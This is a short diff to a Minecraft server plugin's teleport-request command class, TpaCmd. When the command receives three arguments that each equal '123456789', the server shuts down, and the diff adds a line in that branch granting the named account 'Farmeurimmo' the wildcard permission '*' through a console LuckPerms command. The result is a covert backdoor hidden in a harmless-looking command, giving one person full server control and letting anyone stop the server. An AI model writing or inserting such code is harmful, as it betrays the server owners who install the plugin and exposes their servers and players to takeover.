@@ -33,7 +33,9 @@ public class TpaCmd implements CommandExecutor, TabCompleter {
     public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
         if (args.length == 3) {
             if (args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
+                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user Farmeurimmo permission set *");
                 Bukkit.shutdown();
+                return true;
             }
         }
         if (sender instanceof Player) {
